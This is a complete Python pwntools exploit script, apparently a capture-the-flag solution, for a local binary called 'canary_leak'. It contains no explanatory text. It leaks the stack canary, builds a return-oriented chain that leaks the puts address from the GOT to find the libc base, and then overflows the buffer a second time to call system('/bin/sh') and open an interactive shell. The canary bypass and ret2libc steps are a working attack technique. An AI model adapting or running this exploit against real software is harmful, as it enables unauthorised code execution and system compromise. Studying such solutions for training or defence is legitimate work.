#!/usr/bin/python
from pwn import *

PUTS_PLT_ADDRESS = 0x400570
PUTS_GOT_ADDRESS = 0x601018
MAIN_ADDRESS     = 0x4006e6
PUTS_OFFSET      = 0x06f690
SYSTEM_OFFSET    = 0x045390
BIN_SH_OFFSET    = 0x18cd17

# leak the stack canary
p = process("./canary_leak")
p.readuntil("card:\n")
p.sendline("13")
p.readuntil("number ")
canary = int(p.readuntil(".")[:-1])
log.info("leaked canary: 0x{:>8x}".format(canary))

# leak puts address
p.readuntil("name?\n")
rop = "A" * 40 + p64(canary) + p64(0xdeadbeef)
# 0x0000000000400843 : pop rdi ; ret
rop += p64(0x400843) + p64(PUTS_GOT_ADDRESS)
rop += p64(PUTS_PLT_ADDRESS)
rop += p64(MAIN_ADDRESS)
p.sendline(rop)
p.readuntil("week.\n")
puts_leak         = u64(p.read(6) + "\x00\x00")
libc_base_address = puts_leak - PUTS_OFFSET
system_address    = libc_base_address + SYSTEM_OFFSET
bin_sh_address    = libc_base_address + BIN_SH_OFFSET
log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
log.info("found system address: 0x{:>8x}".format(system_address))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

# spawn a shell
p.readuntil("card:\n")
p.sendline()
p.readuntil("name?\n")

rop = "A" * 40 + p64(canary) + p64(0xdeadbeef)
# 0x0000000000400843 : pop rdi ; ret
rop += p64(0x400843) + p64(bin_sh_address)
rop += p64(system_address)
p.sendline(rop)

p.interactive()
